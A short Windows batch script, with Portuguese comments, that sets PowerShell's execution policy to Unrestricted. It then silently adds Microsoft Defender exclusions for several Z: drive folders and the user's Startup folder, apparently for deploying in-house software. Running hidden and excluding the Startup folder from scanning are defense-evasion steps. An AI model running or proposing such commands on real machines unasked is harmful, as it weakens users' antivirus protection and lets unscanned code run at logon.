@echo off
------------------------------------------------------------------------------------------------------------------------

cls
echo Política PowerShell 'Unrestricted'.
powershell -Command "Set-ExecutionPolicy Unrestricted -Force"

------------------------------------------------------------------------------------------------------------------------

:: Executa os comandos no PowerShell para adicionar exclusões de forma oculta
powershell -WindowStyle Hidden -Command "Add-MpPreference -ExclusionPath 'Z:\AFM-3000','Z:\SGL-3000','Z:\TOOLSCCP','Z:\SISTEMA','$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup'"

------------------------------------------------------------------------------------------------------------------------
